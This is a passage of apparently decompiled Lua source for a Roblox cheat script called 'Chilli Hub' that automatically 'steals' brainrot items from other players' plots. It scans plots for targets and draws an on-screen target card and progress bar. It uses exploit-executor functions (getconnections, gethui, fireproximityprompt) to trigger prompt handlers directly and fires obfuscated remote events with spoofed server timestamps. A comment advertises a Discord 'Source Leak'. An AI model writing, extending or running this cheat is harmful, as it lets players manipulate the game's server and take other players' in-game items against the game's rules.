											value46 = nil
										end
									end

									if value46 then
										local str5 = tostring(value46.ObjectText or "")

										list6[#list6 + 1] = {
											Prompt = value46,
											Plot = child,
											Spawn = base,
											Name = str5,
											Generation = func40(base, child, str5, tbl25),
										}
									end
								end
							end
						end
					end

					tbl3 = list6
				end
			end

			local n10
			n10 = 0.03
			local n11
			n11 = -math.huge
			local num7
			num7 = nil
			local value47
			value47 = nil
			local value48
			value48 = nil
			local value49
			value49 = nil
			local value50
			value50 = nil
			local value51
			value51 = nil
			local func42

			func42 = function(param10, param11, distance, generation)
				local tbl26 = { Prompt = param10.Prompt, Plot = param10.Plot, Position = param11 }
				local name = param10.Name
				local name2

				if name then
					name2 = name
				else
					name2 = tostring(param10.Prompt.ObjectText or "")
				end

				tbl26.Name = name2
				tbl26.Generation = generation
				tbl26.Distance = distance
				return tbl26
			end

			prompt2 = nil

			func10 = function(flag28)
				if not flag28 then
					return nil
				end

				for _, item4 in ipairs(tbl3) do
					if item4.Prompt == flag28 then
						return item4
					end
				end

				return nil
			end

			func11 = function(part3)
				if not (prompt2 and prompt2.Parent and part3) then
					return nil
				end
				local flag29 = func10(prompt2)
				if not flag29 then
					return nil
				end
				local position = flag29.Spawn.Position
				return func42(flag29, position, (part3.Position - position).Magnitude, flag29.Generation or 0)
			end

			func12 = function(param12, flag30, param13, flag31)
				if flag5 then
					flag30 = flag31 or flag30
					if flag30 and flag30.Distance <= n3 then
						return flag30
					end
					return nil
				end

				local value52 = func11(param12)
				if value52 then
					return value52
				end
				return param13
			end

			flag9 = "Default (Chilli Hub)"
			func13 = nil
			func14 = nil
			screenGui = Instance.new("ScreenGui")
			screenGui.Name = "ChilliMacLibTargetGui"
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = true
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.Enabled = false

			pcall(function()
				screenGui.Parent = type(gethui) == "function" and gethui() or CoreGui
			end)

			do
				local frame3 = Instance.new("Frame")
				frame3.Name = "TargetCard"
				frame3.AnchorPoint = Vector2.new(0.5, 0)
				frame3.Position = UDim2.new(0.5, 0, 0, 72)
				frame3.Size = UDim2.fromOffset(270, 48)
				frame3.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
				frame3.BackgroundTransparency = 0.15
				frame3.BorderSizePixel = 0
				frame3.Parent = screenGui
				Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 10)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(58, 255, 55)
				uiStroke.Thickness = 1.2
				uiStroke.Transparency = 0.3
				uiStroke.Parent = frame3
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Position = UDim2.fromOffset(12, 5)
				textLabel3.Size = UDim2.new(1, -24, 0, 14)
				textLabel3.Font = Enum.Font.GothamBold
				textLabel3.TextSize = 11
				textLabel3.TextColor3 = Color3.fromRGB(58, 255, 55)
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				textLabel3.Text = "AUTO STEAL (MAC LIB) - MỤC TIÊU GẦN NHẤT"
				textLabel3.Parent = frame3
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(12, 22)
				textLabel4.Size = UDim2.new(1, -24, 0, 20)
				textLabel4.Font = Enum.Font.GothamBlack
				textLabel4.TextSize = 13
				textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.Text = "Đang quét tìm brainrot gần nhất..."
				textLabel4.Parent = frame3
				local flag32 = false
				local value53 = nil
				local vector2 = Vector2.new(0, 0)
				local position = nil

				func4(frame3.InputBegan:Connect(function(input)
					local value54 = flag32
					local flag33

					if flag32 then
						flag33 = value54
					else
						flag33 = input.UserInputState ~= Enum.UserInputState.Begin
					end

					if flag33 then
						return
					end
					local userInputType2 = input.UserInputType == Enum.UserInputType.Touch
					if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not userInputType2 then
						return
					end
					local vector22 = Vector2.new(input.Position.X, input.Position.Y)
					if not func34(frame3, vector22) then
						return
					end
					flag32 = true
					value53 = userInputType2 and input or nil
					vector2 = vector22
					position = frame3.Position
				end))

				func4(UserInputService2.InputChanged:Connect(function(input)
					if not flag32 or not position then
						return
					end

					if value53 and input == value53 or not value53 and input.UserInputType == Enum.UserInputType.MouseMovement then
						local n12 = Vector2.new(input.Position.X, input.Position.Y) - vector2
						frame3.Position = UDim2.new(position.X.Scale, position.X.Offset + n12.X, position.Y.Scale, position.Y.Offset + n12.Y)
					end
				end))

				func4(UserInputService2.InputEnded:Connect(function(input)
					if not flag32 then
						return
					end

					if value53 and input == value53 or not value53 and input.UserInputType == Enum.UserInputType.MouseButton1 then
						flag32 = false
						value53 = nil
						position = nil
					end
				end))

				func15 = function(flag34)
					if not screenGui.Parent then
						return
					end

					if not (flag9 and string.find(flag9, "Mac")) then
						screenGui.Enabled = false
						return
					end
					screenGui.Enabled = true

					if flag34 and flag34.Name then
						local distance2 = flag34.Distance and string.format("%.1fm", flag34.Distance) or ""
						local generation3 = flag34.Generation and flag34.Generation > 0 and " | " .. func8(flag34.Generation) or ""
						textLabel4.Text = string.format("%s (%s)%s", tostring(flag34.Name), distance2, generation3)
					else
						textLabel4.Text = "Đang quét tìm brainrot gần nhất..."
					end
				end
			end

			func16 = function(param14)
				func15(param14)
			end

			do
				local function func43(flag35)
					local match, flag36 = tostring(flag35 or ""):match("%$?([%d%.]+)%s*([KMB]?)")
					if not match then
						return 0
					end
					local n12 = tonumber(match) or 0

					if flag36 == "K" then
						n12 *= 1000
					elseif flag36 == "M" then
						n12 *= 1000000
					elseif flag36 == "B" then
						n12 *= 1e9
					end

					return n12
				end

				local function func44()
					local name = localPlayer.Name
					local displayName = localPlayer.DisplayName
					local plots = Workspace:FindFirstChild("Plots")
					if not plots then
						return nil
					end

					for _, child in ipairs(plots:GetChildren()) do
						local plotSign = child:FindFirstChild("PlotSign")

						if plotSign then
							local surfaceGui = plotSign:FindFirstChild("SurfaceGui")

							if surfaceGui then
								local frame3 = surfaceGui:FindFirstChild("Frame")

								if frame3 then
									local textLabel3 = frame3:FindFirstChildOfClass("TextLabel")

									if textLabel3 and type(textLabel3.Text) == "string" then
										local text = textLabel3.Text
										if string.find(text, displayName, 1, true) or string.find(text, name, 1, true) then
											return child
										end
										continue
									end

									continue
								end
							end
						end
					end

					return nil
				end

				local function func45(instance4)
					if not (instance4 and instance4:IsA("Model")) then
						return nil
					end

					for _, descendant in ipairs(instance4:GetDescendants()) do
						if descendant:IsA("TextLabel") then
							local lowered2 = string.lower(descendant.Name)
							if lowered2 == "generation" or lowered2 == "gen" or lowered2:find("generation") or lowered2:find("gen") then
								return descendant
							end
						end
					end

					return nil
				end

				func17 = function(part4)
					if not part4 then
						return nil, nil, 0
					end
					local position = part4.Position
					local value55 = nil
					local value56 = nil
					local n12 = -math.huge
					local huge = math.huge
					local n13 = 0

					local function func46(instance5, num8, flag37, flag38)
						if not (instance5 and instance5.Parent) then
							return
						end

						if tostring(instance5.ActionText) ~= flag2 then
							return
						end

						if func7(instance5) then
							return
						end

						if not flag37 then
							flag37 = tostring(instance5.ObjectText or "")
						end

						if type(flag38) ~= "number" then
							local flag39 = type(flag38) == "string" and flag38 ~= ""
							local n14 = 0

							if flag39 then
								flag38 = func43(flag38)
							else
								flag38 = n14
							end
						end

						if flag38 == 0 then
							flag38 = func37(flag37)
						end

						if n2 and n2 > 1000 and flag38 > 0 and flag38 < n2 then
							return
						end
						n13 += 1
						local magnitude = (position - num8).Magnitude

						if magnitude <= n3 then
							local tbl27 = {
								Prompt = instance5,
								Spawn = { Position = num8 },
								Position = num8,
								Name = flag37,
								Generation = flag38,
								Distance = magnitude,
							}

							if not value55 or flag38 > n12 then
								value55 = tbl27
								n12 = flag38
							end

							if not value56 or magnitude < huge then
								value56 = tbl27
								huge = magnitude
							end
						end
					end

					local plots = Workspace:FindFirstChild("Plots")
					local n14 = 0

					if n9 then
						n14 = os.clock() < n9
					end

					if plots and not n14 then
						local result6 = func44()

						for _, child in ipairs(plots:GetChildren()) do
							if child ~= result6 then
								local animalPodiums = child:FindFirstChild("AnimalPodiums")

								if animalPodiums then
									for _, child2 in ipairs(animalPodiums:GetChildren()) do
										local base = child2:FindFirstChild("Base")
										local spawn = base and base:FindFirstChild("Spawn")

										if spawn and spawn:IsA("BasePart") then
											local promptAttachment = spawn:FindFirstChild("PromptAttachment") or spawn
											local value57 = nil

											for _, descendant in ipairs(promptAttachment:GetDescendants()) do
												if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == flag2 then
													value57 = descendant
													break
												else
													value57 = nil
												end
											end

											if value57 then
												local str6 = tostring(value57.ObjectText or "")
												local attachment = spawn:FindFirstChild("Attachment")
												attachment = attachment and attachment:FindFirstChild("AnimalOverhead")
												local str7 = ""

												if attachment then
													local generation = attachment:FindFirstChild("Generation")

													if generation and generation:IsA("TextLabel") then
														str7 = generation.Text
													end
												end

												if str7 == "" and str6 ~= "" then
													local obj22 = child:FindFirstChild(str6) or child:FindFirstChild(str6, true)

													if obj22 and obj22:IsA("Model") then
														local value58 = func45(obj22)

														if value58 then
															str7 = value58.Text
														end
													end
												end

												func46(value57, spawn.Position, str6, str7, child.Name, tostring(i))
											end
										end
									end
								end
							end
						end
					end

					local debris = Workspace:FindFirstChild("Debris")

					if debris then
						for _, child in ipairs(debris:GetChildren()) do
							local lowered3 = string.lower(child.Name or "")

							if lowered3 ~= "lucky block" and lowered3 ~= "camera" and not child:IsA("Camera") then
								local value59 = nil

								for _, descendant in ipairs(child:GetDescendants()) do
									if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == flag2 then
										value59 = descendant
										break
									else
										value59 = nil
									end
								end

								if value59 then
									local position2 = child:IsA("BasePart") and child.Position or child:IsA("Model") and child.PrimaryPart and child.PrimaryPart.Position or value59.Parent and value59.Parent:IsA("BasePart") and value59.Parent.Position

									if position2 then
										local str8 = ""

										if child:IsA("Model") then
											local value60 = func45(child)

											if value60 then
												str8 = value60.Text
											end
										end

										func46(value59, position2, tostring(value59.ObjectText or child.Name), str8, nil, nil)
									end
								end
							end
						end
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player.Character then
							local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart then
								for _, descendant in ipairs(player.Character:GetDescendants()) do
									if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == flag2 then
										func46(descendant, humanoidRootPart.Position, tostring(descendant.ObjectText or "Carried Brainrot"), "", nil, nil)
									end
								end
							end
						end
					end

					return value55, value56, n13
				end
			end

			func18 = function(part5)
				if not part5 then
					return nil, nil, nil, nil, 0
				end
				local now = os.clock()
				local position = part5.Position
				if now - n11 < n10 and num7 and (position - num7).Magnitude < 0.5 then
					return value47, value48, value49, value50, value51
				end
				func9(false)
				local n12 = 0
				local value61 = nil
				local value62 = nil
				local value63 = nil
				local value64 = nil
				local value65 = nil
				local value66 = nil
				local value67 = nil
				local value68 = nil

				for _, item5 in ipairs(tbl3) do
					local prompt3 = item5.Prompt

					if prompt3.Parent and prompt3.Enabled and tostring(prompt3.ActionText) == flag2 and not func7(prompt3) then
						local generation = item5.Generation or 0
						local value69 = flag5
						local flag40

						if flag5 then
							flag40 = value69
						else
							flag40 = generation >= n2
						end

						if flag40 then
							n12 += 1
							local position2 = item5.Spawn.Position
							local magnitude = (position - position2).Magnitude

							if not value61 or generation > value62 then
								value61 = func42(item5, position2, magnitude, generation)
								value62 = generation
							end

							if not value63 or magnitude < value64 then
								value63 = func42(item5, position2, magnitude, generation)
								value64 = magnitude
							end

							if magnitude <= n3 then
								if not value65 or generation > value66 then
									value65 = func42(item5, position2, magnitude, generation)
									value66 = generation
								end

								if not value67 or magnitude < value68 then
									value67 = func42(item5, position2, magnitude, generation)
									value68 = magnitude
								end
							end
						end
					end
				end

				n11 = now
				num7 = position
				value47 = value65
				value48 = value67
				value49 = value61
				value50 = value63
				value51 = n12
				return value65, value67, value61, value63, n12
			end

			func19 = function(instance6)
				if not instance6 or not instance6:IsA("ProximityPrompt") or not instance6.Parent or type(getconnections) ~= "function" then
					return nil
				end
				local list7 = {}
				local list8 = {}

				if not pcall(function()
					for _, getconnection in pairs(getconnections(instance6.PromptButtonHoldBegan)) do
						if getconnection and getconnection.Function then
							list7[#list7 + 1] = getconnection.Function
						end
					end

					for _, getconnection2 in pairs(getconnections(instance6.Triggered)) do
						if getconnection2 and getconnection2.Function then
							list8[#list8 + 1] = getconnection2.Function
						end
					end
				end) or #list8 == 0 then
					return nil
				end

				return list7, list8
			end

			do
				local obj23 = CoreGui

				pcall(function()
					if type(gethui) == "function" then
						local hui = gethui()

						if typeof(hui) == "Instance" then
							obj23 = hui
						end
					end
				end)

				local chilliAutoGetBarGui = obj23:FindFirstChild("ChilliAutoGetBarGui")

				if chilliAutoGetBarGui then
					pcall(function()
						chilliAutoGetBarGui:Destroy()
					end)
				end

				screenGui2 = Instance.new("ScreenGui")
				screenGui2.Name = "ChilliAutoGetBarGui"
				screenGui2.ResetOnSpawn = false
				screenGui2.IgnoreGuiInset = true
				screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				screenGui2.Enabled = false
				screenGui2.Parent = obj23
			end

			local color
			color = Color3.fromRGB(58, 255, 55)
			local color2
			color2 = Color3.fromRGB(20, 109, 0)
			local createUIGradient

			do
				local gothamBold = Enum.Font.GothamBold

				pcall(function()
					gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
				end)

				local function func47(param15)
					if typeof(gothamBold) == "Font" then
						param15.FontFace = gothamBold
					else
						param15.Font = Enum.Font.GothamBold
					end
				end

				createUIGradient = function(parent, param16, param17)
					local uiGradient = Instance.new("UIGradient")
					local new = ColorSequenceKeypoint.new
					uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, param16), new(1, param17) })
					uiGradient.Rotation = 90
					uiGradient.Parent = parent
					return uiGradient
				end

				frame = Instance.new("Frame")
				frame.Name = "Holder"
				frame.AnchorPoint = Vector2.new(0.5, 0)
				frame.Position = UDim2.new(0.5, 0, 0, 10)
				frame.Size = UDim2.fromOffset(248, 46)
				frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
				frame.BackgroundTransparency = 0.28
				frame.BorderSizePixel = 0
				frame.Parent = screenGui2
				Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.93
				uiStroke.Parent = frame
				local n12 = 0.125
				local n13 = 248
				local n14 = 1
				local uiScale = Instance.new("UIScale")
				uiScale.Parent = frame

				local function func48()
					local currentCamera = Workspace.CurrentCamera
					local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

					if viewportSize.X < 1 then
						viewportSize = Vector2.new(1280, 720)
					end

					uiScale.Scale = math.clamp(viewportSize.X * n12 * n14 / n13, 0.6, 1.4)
				end

				func48()
				local currentCamera = Workspace.CurrentCamera

				if currentCamera then
					func4(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func48))
				end

				func4(Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(func48))
				textLabel = Instance.new("TextLabel")
				textLabel.BackgroundTransparency = 1
				textLabel.Position = UDim2.fromOffset(14, 8)
				textLabel.Size = UDim2.new(1, -104, 0, 15)
				textLabel.TextSize = 13
				textLabel.TextScaled = true
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.TextTruncate = Enum.TextTruncate.None
				textLabel.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel.Text = ""
				func47(textLabel)
				textLabel.Parent = frame
				local uiTextSizeConstraint = Instance.new("UITextSizeConstraint")
				uiTextSizeConstraint.MinTextSize = 8
				uiTextSizeConstraint.MaxTextSize = 13
				uiTextSizeConstraint.Parent = textLabel
				chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel)
				textLabel2 = Instance.new("TextLabel")
				textLabel2.BackgroundTransparency = 1
				textLabel2.AnchorPoint = Vector2.new(1, 0)
				textLabel2.Position = UDim2.new(1, -14, 0, 8)
				textLabel2.Size = UDim2.fromOffset(88, 15)
				textLabel2.TextSize = 13
				textLabel2.TextXAlignment = Enum.TextXAlignment.Right
				textLabel2.TextColor3 = color
				textLabel2.Text = ""
				func47(textLabel2)
			end

			textLabel2.Parent = frame
			local frame3 = Instance.new("Frame")
			frame3.Position = UDim2.fromOffset(14, 30)
			frame3.Size = UDim2.new(1, -28, 0, 6)
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame3.BackgroundTransparency = 0.88
			frame3.BorderSizePixel = 0
			frame3.Parent = frame
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
			frame2 = Instance.new("Frame")
			frame2.Size = UDim2.new(0, 0, 1, 0)
			frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame2.BorderSizePixel = 0
			frame2.Parent = frame3
			Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)
			createUIGradient(frame2, color, color2)
		end

		local frame3, visible, flag41, n8, n9, n10, n11, func49, func50, obj24
		local func51, func52, func53

		do
			local frame4 = Instance.new("Frame")
			frame4.Position = UDim2.fromOffset(14, 41)
			frame4.Size = UDim2.new(1, -28, 0, 4)
			frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame4.BackgroundTransparency = 0.9
			frame4.BorderSizePixel = 0
			frame4.Visible = false
			frame4.Parent = frame
			Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
			frame3 = Instance.new("Frame")
			frame3.Size = UDim2.new(0, 0, 1, 0)
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame3.BackgroundTransparency = 0.55
			frame3.BorderSizePixel = 0
			frame3.Parent = frame4
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
			visible = false
			flag41 = false
			n8 = 0
			n9 = 1
			n10 = 0
			n11 = 0

			func49 = function()
				flag41 = false
			end

			func50 = function(param18)
				if not flag6 or not screenGui2.Parent then
					flag41 = false
					return
				end
				n9 = math.max(tonumber(param18) or 1, 0.01)
				n8 = os.clock()
				flag41 = true
			end

			local n12 = 0.22
			local n13 = 10
			local color = Color3.fromRGB(255, 255, 255)
			obj24 = nil
			local value70 = nil
			local radius = 0

			func51 = function()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if value70 then
					pcall(function()
						value70:Destroy()
					end)

					value70 = nil
				end

				if obj24 then
					pcall(function()
						obj24:Destroy()
					end)

					obj24 = nil
				end

				radius = 0
			end

			local function func54()
				if obj24 and obj24.Parent and value70 then
					return
				end
				func51()
				local part = Instance.new("Part")
				part.Name = func1()
				part.Anchored = true
				part.CanCollide = false
				part.CanQuery = false
				part.CanTouch = false
				part.CastShadow = false
				part.Massless = true
				part.Size = Vector3.one
				part.Transparency = 1
				part.Parent = Workspace
				local cylinderHandleAdornment = Instance.new("CylinderHandleAdornment")
				cylinderHandleAdornment.Name = func1()
				cylinderHandleAdornment.Adornee = part
				cylinderHandleAdornment.AlwaysOnTop = true
				cylinderHandleAdornment.Color3 = color
				cylinderHandleAdornment.Height = 0.05
				cylinderHandleAdornment.InnerRadius = 0
				cylinderHandleAdornment.Radius = 0
				cylinderHandleAdornment.Transparency = 0.25
				cylinderHandleAdornment.ZIndex = 1
				cylinderHandleAdornment.Parent = part
				obj24 = part
				value70 = cylinderHandleAdornment
			end

			func52 = function(flag42)
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

				if not visible or not character_ then
					if obj24 then
						func51()
					end

					return
				end

				func54()
				local n14 = math.max(tonumber(n3) or 20, 1)
				local n15 = math.min(flag42 or 0.016, 0.1)

				if radius <= 0 then
					radius = n14
				else
					radius += (n14 - radius) * (1 - math.exp(-n15 * n13))
				end

				obj24.CFrame = CFrame.new(character_.Position - Vector3.new(0, 2.9, 0)) * CFrame.Angles(-1.5707963267948966, 0, 0)
				value70.Radius = radius
				value70.InnerRadius = math.max(radius - n12, 0)
			end

			func53 = function(flag43)
				visible = flag43 == true
				frame4.Visible = visible
				frame.Size = UDim2.fromOffset(248, visible and 55 or 46)

				if not visible then
					n11 = 0
					frame3.Size = UDim2.new(0, 0, 1, 0)
					func51()
				end
			end
		end

		local func55

		func55 = function(flag44, flag45, param19)
			if textLabel.Parent then
				textLabel.Text = tostring(flag44 or "")
				chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle, param19)
			end

			if textLabel2.Parent then
				textLabel2.Text = tostring(flag45 or "")
			end
		end

		do
			local flag46 = false
			local value71 = nil
			local vector2 = Vector2.new(0, 0)
			local position = nil

			func4(frame.InputBegan:Connect(function(input)
				if flag46 or input.UserInputState ~= Enum.UserInputState.Begin then
					return
				end
				local userInputType3 = input.UserInputType == Enum.UserInputType.Touch
				if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not userInputType3 then
					return
				end
				local vector22 = Vector2.new(input.Position.X, input.Position.Y)
				local absolutePosition = frame.AbsolutePosition
				local absoluteSize = frame.AbsoluteSize
				if vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y then
					return
				end
				flag46 = true
				value71 = userInputType3 and input or nil
				vector2 = vector22
				position = frame.Position
			end))

			func4(UserInputService2.InputChanged:Connect(function(input)
				if not flag46 then
					return
				end

				if not (value71 and input == value71 or not value71 and input.UserInputType == Enum.UserInputType.MouseMovement) or not position then
					return
				end
				local n12 = Vector2.new(input.Position.X, input.Position.Y) - vector2
				frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n12.X, position.Y.Scale, position.Y.Offset + n12.Y)
			end))

			func4(UserInputService2.InputEnded:Connect(function(input)
				if not flag46 then
					return
				end
				local flag47 = value71 and input == value71
				local flag48

				if flag47 then
					flag48 = flag47
				else
					flag48 = not value71 and input.UserInputType == Enum.UserInputType.MouseButton1
				end

				if flag48 then
					flag46 = false
					value71 = nil
					position = nil
				end
			end))
		end

		local func56

		func56 = function()
			if screenGui2.Parent then
				screenGui2.Enabled = flag4 and flag6
			end

			if not flag4 or not flag6 then
				func49()
				func55("", "")
			end
		end

		do
			local n12 = 1
			local n13 = 0.25
			local n14 = -math.huge
			local n15 = -math.huge

			local function func57()
				if not flag4 then
					return
				end
				local now = os.clock()
				if now - n14 < n12 then
					return
				end
				n14 = now

				task.spawn(function()
					func14()
					task.wait(0.05)
					func13()
				end)
			end

			local function func58(list9)
				local now = os.clock()
				if now - n15 < n13 then
					return
				end
				n15 = now

				for _, item6 in ipairs(list9) do
					pcall(item6)
				end
			end

			local function func59(instance7)
				if not (instance7 and instance7.Parent) or type(getconnections) ~= "function" then
					return
				end

				pcall(function()
					for _, getconnection3 in pairs(getconnections(instance7.PromptButtonHoldEnded)) do
						if getconnection3 and getconnection3.Function then
							pcall(getconnection3.Function)
						end
					end
				end)
			end

			local function func60(param20, flag49, callback2, param21, flag50)
				local prompt3 = type(param20) == "table" and param20.Prompt or param20
				local plotName = type(param20) == "table" and param20.PlotName or nil
				local slotName = type(param20) == "table" and param20.SlotName or nil
				if not prompt3 then
					return false, "no prompt"
				end

				if flag9 == "Fix 1 (Wait Before Fire)" then
					task.wait(0.1)
				end
				-- 𝖲𝖫 | 𝖲𝗈𝗎𝗋𝖼𝖾 𝖫𝖾𝖺𝗄 | https://discord.gg/x7YbZeezpm

				local n16 = os.clock() - n6
				local n17 = 0

				if flag9 == "Fix 2 (Longer Settle)" then
					n17 = 1.5
				end

				if n16 < n17 then
					task.wait(n17 - n16)
				end

				if not flag3 or not flag4 or flag49 ~= n5 then
					return false, "stopped"
				end
				local flag51, flag52 = func19(prompt3)
				if not flag51 or not flag52 then
					return false, "no handlers"
				end
				local n18 = 1.3

				if flag7 then
					flag7 = false
					n18 = 2
				end

				if param21 then
					pcall(param21, n18)
				end

				if flag9 == "Xen Hub Source v11" then
					if plotName and slotName then
						local function func61()
							pcall(function()
								local reB096e1ca9c3a453b8b60268b235083 = game:GetService("ReplicatedStorage").Packages.Net["RE/b096e1ca-9c3a-453b-8b60-268b235083b9"]
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "5c0bd012-dfb2-4bac-8f1a-e41f136e4744")
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "6be28b5b-dbc3-4aab-aa0c-6ebcfa191f22")
							end)
						end

						local function func62(param22, param23)
							pcall(function()
								game:GetService("ReplicatedStorage").Packages.Net["RE/5aa39ea1-0c65-4fcf-aff9-b18a7ef277c3"]:FireServer(Workspace:GetServerTimeNow() + 67, "c262398d-68e3-4499-8bea-99766bf11686", param22, tonumber(param23) or param23)
								local obj25
								obj25:FireServer(Workspace:GetServerTimeNow() + 67, "579e6c26-5a80-407d-9488-0f84752e8f1f", param22, tonumber(param23) or param23)
							end)
						end

						func61()
						task.wait(1.3)
						func62(plotName, slotName)
						return true, "fired xen hub source"
					end

					for _, item7 in ipairs(flag51) do
						pcall(item7)
					end

					task.wait(1.3)

					for _, item8 in ipairs(flag52) do
						pcall(item8)
					end

					return true, "fired fallback"
				end

				if flag9 and string.find(flag9, "v20") and localPlayer:GetAttribute("Stealing") == true then
					return false, "v20_radar"
				end

				if flag9 and string.find(flag9, "v21") then
					local now = os.clock()

					while not prompt3.Enabled and prompt3.Parent and os.clock() - now < 0.6 do
						task.wait(0.02)
					end
				end

				if os.clock() - n6 < 1.5 and flag9 and (string.find(flag9, "Smart Window") or string.find(flag9, "v19") or string.find(flag9, "v19")) then
					for _, item9 in ipairs(flag51) do
						pcall(item9)
					end

					task.wait(n18)

					for _, item10 in ipairs(flag52) do
						pcall(item10)
					end

					n6 = os.clock()
					return true, "fired (v14 protected window)"
				end

				local flag53 = flag9 and string.find(flag9, "v23")

				if flag53 then
					local value72 = globalCacheLockUntil
					flag53 = os.clock() < value72
				end

				if (isDebris or flag53) and flag9 and string.find(flag9, "v22") then
					for _, item11 in ipairs(flag51) do
						pcall(item11)
					end

					task.wait(n18)

					for _, item12 in ipairs(flag52) do
						pcall(item12)
					end

					func59(prompt3)
					n6 = os.clock()
					return true, "fired (v22 debris cache hold)"
				end

				if flag9 == "Fix 4 (FireProximityPrompt)" then
					if fireproximityprompt then
						fireproximityprompt(prompt3, 0)
						fireproximityprompt(prompt3, 1)
					end
				end

				for _, item13 in ipairs(flag51) do
					pcall(item13)
				end

				local objectText = tostring(prompt3.ObjectText)
				local now = os.clock()

				while os.clock() - now < n18 do
					task.wait(0.05)
					if not flag3 or not flag4 or flag49 ~= n5 then
						func59(prompt3)
						return false, "stopped"
					end

					if not flag50 and localPlayer:GetAttribute("Stealing") == true then
						for _, item14 in ipairs(flag52) do
							pcall(item14)
						end

						func59(prompt3)
						return false, "carrying"
					end

					if tostring(prompt3.ObjectText) ~= objectText then
						func58(flag52)
						func57()
						func59(prompt3)
						return false, "brainrot changed"
					end

					if not prompt3.Parent or not prompt3.Enabled or not callback2() then
						func58(flag52)
						func57()
						func59(prompt3)
						return false, "retargeted"
					end
				end

				local flag54

				if flag9 == "Default (Chilli Hub)" or flag9 == "Fix 3 (Re-fetch Triggers)" then
					local value73
					value73, flag54 = func19(prompt3)
					flag54 = flag54 or flag52
				else
					flag54 = flag52
				end

				for _, item15 in ipairs(flag54) do
					pcall(item15)
				end

				func59(prompt3)
				n6 = os.clock()
				return true, "fired"
			end

			local function func63(part6, flag55, flag56)
				if not flag3 or not flag4 or flag55 ~= n5 then
					return false
				end

				if flag56 and localPlayer:GetAttribute("Stealing") ~= true then
					return false
				end
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return false
				end

				if flag5 then
					local prompt3 = part6.Prompt
					if not prompt3 or not prompt3.Parent or not prompt3.Enabled or tostring(prompt3.ActionText) ~= flag2 or func7(prompt3) then
						return false
					end
					local position = part6.Position
					return not position or (humanoidRootPart.Position - position).Magnitude <= n3
				end

				if prompt2 and prompt2.Parent then
					return part6.Prompt == prompt2
				end
				local flag57

				if flag9 and (string.find(flag9, "Mac Lib") or string.find(flag9, "Original")) then
					local value74
					value74, flag57 = func17(humanoidRootPart)
				else
					local value75
					value75, flag57 = func18(humanoidRootPart)
				end

				if not flag57 then
					return false
				end

				if flag57.Prompt == part6.Prompt then
					return true
				end
				return flag57.Distance >= (humanoidRootPart.Position - part6.Position).Magnitude - n
			end

			local function func64(flag58)
				local value76 = prompt
				local parent = prompt

				if value76 then
					parent = value76.Parent
				end

				if parent then
					local now = os.clock()

					while flag3 and flag4 and flag58 == n5 and os.clock() - now < 1 do
						if value76.Enabled and tostring(value76.ActionText) == flag2 then
							return
						end
						task.wait(0.05)
					end
				else
					task.wait(0.2)
				end
			end

			local function func65(flag59)
				local flag60 = false

				while true do
					if flag3 and flag4 and flag59 == n5 then
						local flag61 = localPlayer:GetAttribute("Stealing") == true

						if not flag60 then
							if flag9 and string.find(flag9, "v19") then
								task.wait()
							else
								task.wait(0.1)
							end
						end

						local flag62 = not flag3 or not flag4 or flag59 ~= n5
						flag60 = false

						if not flag62 then
